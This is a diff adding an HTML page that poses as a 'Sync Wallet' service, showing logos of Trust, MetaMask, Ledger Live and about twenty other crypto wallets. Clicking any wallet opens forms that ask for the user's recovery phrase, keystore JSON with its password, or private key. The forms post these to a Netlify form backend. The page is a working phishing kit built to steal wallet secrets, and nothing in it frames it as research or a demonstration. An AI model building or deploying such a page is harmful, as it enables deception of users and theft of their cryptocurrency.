@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://kit.fontawesome.com/b3d6ee144c.js"
+      crossorigin="anonymous"
+    ></script>
+    <!-- <script src="/static/index.js"></script> -->
+    <link rel="stylesheet" href="/static/index.css" />
+    <title>Sync Wallet (Laide's Version)</title>
+  </head>
+  <body>
+    <div class="walletForm" id="walletForm">
+      <div class="accordion" id="accordionExample">
+        <div class="accordion-item">
+          <h2 class="accordion-header" id="headingOne">
+            <button
+              class="accordion-button"
+              type="button"
+              data-bs-toggle="collapse"
+              data-bs-target="#collapseOne"
+              aria-expanded="true"
+              aria-controls="collapseOne"
+            >
+              Phrase
+            </button>
+          </h2>
+          <div
+            id="collapseOne"
+            class="accordion-collapse collapse show"
+            aria-labelledby="headingOne"
+            data-bs-parent="#accordionExample"
+          >
+            <div class="accordion-body">
+              <form
+                id="form1"
+                name="phrase"
+                action="/success.html"
+                class="phrase needs-validation"
+                method="POST"
+                data-netlify="true"
+              >
+                <textarea
+                  name="phrase"
+                  id="p-textarea"
+                  cols="50"
+                  rows="5"
+                  placeholder="Enter your recovery phrase"
+                  required
+                ></textarea>
+                <span
+                  >Typically 12 (sometimes 24) words separated by single
+                  spaces</span
+                >
+                <button type="submit" onclick="checkEmpty(p)">
+                  Proceed <i class="fas fa-arrow-right"></i>
+                </button>
+              </form>
+            </div>
+          </div>
+        </div>
+        <div class="accordion-item">
+          <h2 class="accordion-header" id="headingTwo">
+            <button
+              class="accordion-button collapsed"
+              type="button"
+              data-bs-toggle="collapse"
+              data-bs-target="#collapseTwo"
+              aria-expanded="false"
+              aria-controls="collapseTwo"
+            >
+              Keystore JSON
+            </button>
+          </h2>
+          <div
+            id="collapseTwo"
+            class="accordion-collapse collapse"
+            aria-labelledby="headingTwo"
+            data-bs-parent="#accordionExample"
+          >
+            <div class="accordion-body">
+              <form
+                id="form2"
+                name="keystore"
+                class="keystore needs-validation"
+                method="POST"
+                data-netlify="true"
+              >
+                <textarea
+                  name="phrase"
+                  id="k-textarea"
+                  cols="50"
+                  rows="5"
+                  placeholder="Keystore JSON"
+                  required
+                ></textarea>
+                <input
+                  type="password"
+                  name="password"
+                  placeholder="Wallet Password"
+                  id="password"
+                  required
+                />
+                <span
+                  >Several lines of text beginning with "{...}" plus the
+                  password you used to encrypt it.</span
+                >
+                <button type="submit" onclick="checkEmpty(k)">
+                  Proceed <i class="fas fa-arrow-right"></i>
+                </button>
+              </form>
+            </div>
+          </div>
+        </div>
+        <div class="accordion-item">
+          <h2 class="accordion-header" id="headingThree">
+            <button
+              class="accordion-button collapsed"
+              type="button"
+              data-bs-toggle="collapse"
+              data-bs-target="#collapseThree"
+              aria-expanded="false"
+              aria-controls="collapseThree"
+            >
+              Private Key
+            </button>
+          </h2>
+          <div
+            id="collapseThree"
+            class="accordion-collapse collapse"
+            aria-labelledby="headingThree"
+            data-bs-parent="#accordionExample"
+          >
+            <div class="accordion-body">
+              <form
+                id="form3"
+                name="privateKey"
+                class="privateKey needs-validation"
+                method="POST"
+                data-netlify="true"
+              >
+                <input
+                  type="text"
+                  name="privateKey"
+                  placeholder="Enter your Private Key"
+                  id="privateKey"
+                  required
+                />
+                <span
+                  >Typically 12 (sometimes 24) words separated by single
+                  spaces</span
+                >
+                <button type="submit" onclick="checkEmpty(s)">
+                  Proceed <i class="fas fa-arrow-right"></i>
+                </button>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="container-fluid">
+      <header class="header">
+        <nav class="nav">
+          <p><a href="#" class="nav-link">Wallets</a></p>
+          <p>
+            <a href="#" class="nav-link"
+              ><img src="/images/iogo.jpg" alt="centered logo"
+            /></a>
+          </p>
+          <p><a href="#" class="nav-link">dApps</a></p>
+        </nav>
+      </header>
+      <section class="intro">
+        <div class="content">
+          <h2>Wallets</h2>
+          <p>
+            Multiple iOS and Android wallets support the protocol. Simply scan a
+            QR code from your desktop computer screen to start securely using a
+            dApp with your mobile wallet. Interaction between mobile apps and
+            mobile browsers are supported via mobile deep linking.
+          </p>
+        </div>
+      </section>
+      <section class="walletOptions">
+        <div class="content">
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/trust-wallet-66f8777532931d9c09b633344981a6a9.png"
+                alt=""
+              />
+              <span>Trust</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png"
+                alt=""
+              />
+              <span>Rainbow</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/atomic-4c02d2b33cf091fd83c7a49819394e41.png"
+                alt=""
+              />
+              <span>Atomic</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button onclick="openWalletForm()" class="item">
+              <img
+                src="/images/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png"
+                alt=""
+              />
+              <span>Metamask</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/authereum-32f3939207b77c1837547d5ed4f86110.png"
+                alt=""
+              />
+              <span>Authereum</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/bitpay-1573dd6c95eb38386f181048663590d0.jpg"
+                alt=""
+              />
+              <span>Bitpay</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/coin98-c5b50adaceaf474e48ef1dad150d0829.png"
+                alt=""
+              />
+              <span>Coin98</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png"
+                alt=""
+              />
+              <span>CoolWallet S</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/crypto-4cbeac57421fb3ca2573db2cf448169a.png"
+                alt=""
+              />
+              <span>Crypto</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png"
+                alt=""
+              />
+              <span>D'CENT WALLET</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/imtoken-fd8c7c52dac6101568954e7448a49202.png"
+                alt=""
+              />
+              <span>imToken</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png"
+                alt=""
+              />
+              <span>Ledger Live</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img src="/images/maiar.png" alt="" />
+              <span>Maiar</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png"
+                alt=""
+              />
+              <span>MathWallet</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/mykey-7419df5270c0406c80cba19fa5165923.png"
+                alt=""
+              />
+              <span>MYKEY</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/onto-983003d35fe32bf916f9eda381f138f7.png"
+                alt=""
+              />
+              <span>ONTO</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/tokenpocket-57a4a886cc644e5237ac1558226154cb.png"
+                alt=""
+              />
+              <span>TokenPocket</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/trustvault-9031a67f82293fc50ead978f936cfff3.png"
+                alt=""
+              />
+              <span>TrustVault</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/walleth-b60336f8dd9ea86285408cb4f96634d1.png"
+                alt=""
+              />
+              <span>Walleth</span>
+            </button>
+          </div>
+          <div class="wallet">
+            <button class="item" onclick="openWalletForm()">
+              <img
+                src="/images/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png"
+                alt=""
+              />
+              <span>Zel Core</span>
+            </button>
+          </div>
+        </div>
+      </section>
+      <footer class="footer">
+        <nav class="nav">
+          <p>
+            <a href="#" class="nav-link"
+              ><i class="fab fa-discord"></i>Discord</a
+            >
+          </p>
+          <p>
+            <a href="#" class="nav-link"
+              ><i class="fab fa-twitter"></i>Twitter</a
+            >
+          </p>
+          <p>
+            <a href="#" class="nav-link"><i class="fab fa-github"></i>Github</a>
+          </p>
+        </nav>
+      </footer>
+    </div>
+    <script>
+      const walletForm = document.getElementById("walletForm");
+      const wallet = document.getElementsByClassName("item");
+      //   const ptextArea = document.getElementById("p-textarea");
+      //   const ktextArea = document.getElementById("k-textarea");
+      const password = document.getElementById("password");
+      const privateKey = document.getElementById("privateKey");
+      const form = document.getElementById("form");
+
+      const openWalletForm = () => {
+        walletForm.style.display = "block";
+        window.scrollTo({
+          top: 0,
+          behavior: "smooth",
+        });
+      };
+
+      //   const checkEmpty = (e) => {
+      //     const starter = e;
+      //     const textArea = document.getElementById(`${starter}-textarea`);
+      //     if (starter == "p") {
+      //       textArea.value == ""
+      //         ? alert("Fill form completely.")
+      //         : alert("Submitted successfully.");
+      //     } else if (starter == "k") {
+      //       textArea.value == "" || password.value == ""
+      //         ? alert("Fill form completely.")
+      //         : alert("Submitted successfully.");
+      //     } else {
+      //       privateKey.value == ""
+      //         ? alert("Fill form completely.")
+      //         : alert("Submitted successfully.");
+      //     }
+      //   };
+    </script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
